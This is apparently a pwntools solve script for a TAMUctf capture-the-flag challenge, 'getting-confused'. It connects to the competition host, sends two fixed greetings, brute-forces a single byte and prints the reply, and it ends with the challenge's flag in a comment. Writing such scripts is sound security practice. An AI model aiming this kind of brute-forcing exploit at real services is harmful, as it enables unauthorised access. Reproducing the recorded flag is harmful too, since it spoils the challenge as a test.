#!/bin/python
from pwn import *
elf = ELF('./getting-confused', checksec=False)
with context.local(log_level='error'):
    while True:
        for i in range(0,10):
            try:
                print i,
                p = remote('challenges.tamuctf.com',4352)
                p.sendlineafter('.', "howdy")
                p.sendlineafter('.', "gig 'em")
                p.recvline()
                p.send(chr(i)+'\n')
                res = p.recvlines(4)[-1]
                print res
                break
            except:
                p.close()
                pass
# gigem{fg3ts_g3t5_c0nfu5ed_2}